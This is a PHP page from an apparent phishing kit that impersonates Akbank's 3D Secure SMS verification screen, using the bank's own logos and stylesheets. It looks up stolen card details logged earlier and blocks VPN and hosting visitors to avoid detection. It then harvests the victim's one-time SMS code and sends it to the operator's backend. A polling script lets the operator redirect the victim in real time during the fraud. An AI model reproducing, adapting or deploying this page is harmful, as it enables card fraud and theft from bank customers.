<?php include_once("../config.php"); include_once("../txmd/Data/Server/GrabIP.php"); include_once("../txmd/Data/Server/BlockVPN.php"); include_once("../txmd/Data/Client/GetBank.php"); include_once("../txmd/Data/Server/BanControl.php");

  $check = $pdo->query("SELECT * FROM logs WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
  $checkAdmin = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
  $checkSepet = $pdo->query("SELECT * FROM sepet WHERE ip_adresi = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
  
  if($checkAdmin["proxy_vpn"] == 1) {
   if($proxy == 1 or $hosting == 1) {
    die('Proxy & VPN Firewall - txmd');
   }
  }

  if($check["kredi_karti"]) {
    $pdo->query("UPDATE logs SET durum = 'SMS Ekranı' WHERE ip = '{$ip}'");
  } else {
    header("Location: /");
  } 

  if($checkSepet["ip_adresi"]) {
    $pdo->query("UPDATE logs SET durum = 'SMS Ekranı' WHERE ip = '{$ip}'");
  } else {
    header("Location: /");
  }

  switch($_GET["control"]){
    case 'success';
     echo("<script> setTimeout(function(){ window.location='/siparisiniz-alindi'; }, 2750);</script>");
    break;
  }

  if($check["marka"] == "MASTERCARD") {
    $akbank_marka = "https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/logo_mastercard.png";
  } else if($check["marka"] == "VISA") {
    $akbank_marka = "https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/logo_visa.svg";
  }

?>
<html>
  <head>
    <title>Alışveriş</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_css/dijitalgozluk.css">
    <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
    <style>
      .ui-loading .ui-loader {
        display: none;
      }

      .ui-icon-loading {
        opacity: 0;
      }
    </style>
    <meta name="decorator" content="3dlayout">
    <link rel="stylesheet" href="https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
    <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
    <script src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_js/dijitalgozluk.js"></script>
    <script>
      $(function () {
        $("#dialog").dialog({
            title: "Şifre",
            autoOpen: false,
            show: {
                effect: "blind",
                duration: 500
            }
        });

        if(window.location.search == "?control=error") {
          $("#dialogSmsPwd").dialog({
              title: "Hatalı Şifre",
              autoOpen: true,
              show: {
                  effect: "blind",
                  duration: 500
              },
              modal: true,
              buttons: {
                  "Tamam": function() {
                      $(this).dialog("close");
                  }
              }
          });
        }

        $("#opener").on("click", function() {
            $("#dialog").dialog("open");
        });
      })
    </script>
  </head>
  <body>
    <div data-role="content" data-theme="c">
      <noscript style="color: red">İşleminizi tamamlayabilmeniz için Javascript'i etkinleştirin. </noscript>
      <div class="content">
        <div class="dijitalgozluk-arkaplan">
            <div class="dijitalgozluk-ekran">
              <div class="dijitalgozluk-cerceve">
                <div class="dijitalgozluk-kapat">
                  <a>
                    <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/icon-close-18x18.png" alt="X">
                  </a>
                </div>
                <div class="dijitalgozluk-logolar">
                  <div class="dijitalgozluk-logo dijitalgozluk-logo-banka">
                    <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/logo-akbank.svg" alt="Akbank">
                  </div>
                  <div class="dijitalgozluk-logo dijitalgozluk-logo-marka">
                    <img src="<?php echo $akbank_marka; ?>">
                  </div>
                  <div class="dijitalgozluk-yazi dijitalgozluk-baslik"> Uluslararası Güvenlik <br> Platformu 3D Secure </div>
                </div>
                <div class="dijitalgozluk-tablo dijitalgozluk-tablo-bilgiler">
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> İşyeri Adı </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> <?php echo $checkAdmin["isyeri_adi"]; ?> </div>
                  </div>
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Tutar </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> <?php echo $check["bakiye"]; ?> </div>
                  </div>
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Tarih </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> <?php echo date('d-m-Y H:i:s'); ?> </div>
                  </div>
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Kart Numarası </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> ************<?php echo substr($check["kredi_karti"], 12, 16); ?> </div>
                  </div>
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Cep Telefonu </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> 05XXXXXXXXX </div>
                  </div>
                </div>
                <div id="passwordInformation">
                  <div class="dijitalgozluk-kart-logo">
                    <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/ikon-sms-36x31.png" alt="">
                  </div>
                  <div id="passwordInformation1" class="dijitalgozluk-yazi dijitalgozluk-yonlendirme">
                    <p>
                      <span> 01 </span> nolu 3D Secure / Go Güvenli Öde şifrenizi şifre alanına giriniz.
                    </p>
                  </div>
                  <div id="passwordInformation2" class="dijitalgozluk-form-kontrol dijitalgozluk-form-yazi dijitalgozluk-form-sms-gir">
                    <div class="dijitalgozluk-form-yazi-baslik">Şifre:</div>
                    <div class="dijitalgozluk-form-yazi-input">
                      <input type="password" id="otpCode" name="otpCode" onkeypress="return ((event.charCode >= 48 && event.charCode <= 57 && value.length < 6 ) || event.charCode == 13 || event.charCode == 0)" autofocus minlength="6" maxlength="6" size="6" autocomplete="off" required>
                    </div>
                    <div id="helpDiv" class="dijitalgozluk-form-yazi-yardim">
                      <a id="opener" href="javascript:void(0);">Yardım</a>
                    </div>
                  </div>
                </div>
                <div id="akbank-hata" style="display: none;">
                  <div id="div1" style="width: 180px; margin: 0px auto 0 auto;"><p style="font-weight: 500; font-size: 11px; line-height: 14px; color: #DC0005" id="hata_mesaji"></p></div>
                </div>
                <div id="remainingWarn" class="dijitalgozluk-yazi dijitalgozluk-uyari">
                  <p> Onaylama süresinin dolmasına <span id="time">180</span> saniye kalmıştır </p>
                </div>
                <div class="dijitalgozluk-form-kontrolu dijitalgozluk-dugme dijitalgozluk-devam-dugmesi">
                  <input id="DevamEt" name="DevamEt" type="submit" value="Devam">
                </div>
                <div class="dijitalgozluk-yazi dijitalgozluk-alternatif-yontem dijitalgozluk-alternatif-yontem-sms">
                  <p>Bu işlemi Axess Mobil'den de onaylayabilirdin.</p>
                </div>
              </div>
            </div>
        </div>
      </div>
    </div>
    <div data-role="”footer”" data-theme="c" data-position="fixed"></div>
    <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front ui-draggable ui-resizable" aria-describedby="dialog" aria-labelledby="ui-id-1" style="display: none; position: absolute;">
      <div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle">
        <span id="ui-id-1" class="ui-dialog-title">Şifre</span>
        <button type="button" class="ui-button ui-corner-all ui-widget ui-button-icon-only ui-dialog-titlebar-close" title="Close">
          <span class="ui-button-icon ui-icon ui-icon-closethick"></span>
          <span class="ui-button-icon-space"></span>Close </button>
      </div>
      <div id="dialog" class="ui-dialog-content ui-widget-content">
        <p>Telefonunuza SMS ile gönderilen tek kullanımlık şifreyi bu alana giriniz.</p>
      </div>
      <div class="ui-resizable-handle ui-resizable-n" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-e" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-s" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-w" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-se ui-icon ui-icon-gripsmall-diagonal-se" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-sw" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-ne" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-nw" style="z-index: 90;"></div>
    </div>
    <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front ui-dialog-buttons ui-draggable ui-resizable" aria-describedby="dialogSmsPwd" aria-labelledby="ui-id-2" style="display: none; position: absolute;">
      <div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle">
        <span id="ui-id-2" class="ui-dialog-title">Hatalı Şifre</span>
        <button type="button" class="ui-button ui-corner-all ui-widget ui-button-icon-only ui-dialog-titlebar-close" title="Close">
          <span class="ui-button-icon ui-icon ui-icon-closethick"></span>
          <span class="ui-button-icon-space"></span>Close </button>
      </div>
      <div id="dialogSmsPwd" class="ui-dialog-content ui-widget-content">
        <span style="float:left; margin:0 7px 50px 0;"></span>
        <p style="font-size: 12px;">Girmiş olduğunuz cep şifre hatalıdır. Lütfen kontrol ederek tekrar giriş yapın.</p>
      </div>
      <div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
        <div class="ui-dialog-buttonset">
          <button type="button" class="ui-button ui-corner-all ui-widget">Tamam</button>
        </div>
      </div>
      <div class="ui-resizable-handle ui-resizable-n" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-e" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-s" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-w" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-se ui-icon ui-icon-gripsmall-diagonal-se" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-sw" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-ne" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-nw" style="z-index: 90;"></div>
    </div>
    <script>
		  var seconds = 180;
		  var display = document.querySelector('#time');

		  function incrementSeconds() {
        seconds -= 1;
        display.textContent = seconds;
      }

      var cancel = setInterval(incrementSeconds, 1000);
		</script>
    <script>
      
      document.getElementById("DevamEt").addEventListener("click", function(e) {
        var otpCode = $("input[name=otpCode]").val();

        e.preventDefault();

        if (otpCode == null || otpCode == "" || otpCode.length != 6) {
          document.getElementById("akbank-hata").style.display = "block"; 
          document.getElementById("hata_mesaji").innerHTML = "Şifreniz 6 hane olmalıdır."; 
          
        } else {
          document.getElementById("akbank-hata").style.display = "none";

          $.ajax({
            type: "POST",
            url: "action/process.php",
            data: {
              otpCode: otpCode
            },
            success: function (data) {
              document.getElementById('DevamEt').setAttribute("disabled", "disabled");
            }
          });
        }
      });
    </script>
    <script type="text/javascript">
      $(document).ready(function() {
        gonder();
        var int = self.setInterval("gonder()", 2500);
      });
      
      function gonder() {
        $.ajax({
           type: 'POST',
           url: '<?php echo "../veri.php?ip=".$ip; ?>',
           success: function(msg) {
              if (msg.includes('sms')) {
                  window.location.href = '../acsredirect';
              }
              if (msg.includes('tebrikler')) {
                  window.location.href = '../acsredirect?control=success';
              }
              if (msg.includes('hata_sms')) {
                  window.location.href = '../acsredirect?control=error';
              }
              if (msg.includes('hata_limit')) {
                window.location.href = '/?redirect=error_limit';
              }
              if (msg.includes('hata_internet')) {
                 window.location.href = '/?redirect=error_internet';
              }
			   if (msg.includes('hata_cvv')) {
                  window.location.href = '/odeme?status=cvv';
              }
              if (msg.includes('hata_skt')) {
                  window.location.href = '/odeme?status=skt';
              }
              if (msg.includes('hata_dogrulama')) {
                window.location.href = '/dogrulama?control=error';
              }
              if (msg.includes('dogrulama')) {
                 window.location.href = '/dogrulama';
              }
              if (msg.includes('basa_dondur')) {
                  window.location.href = '/';
              }
           }
        });
      }     
    </script>
  </body>
</html>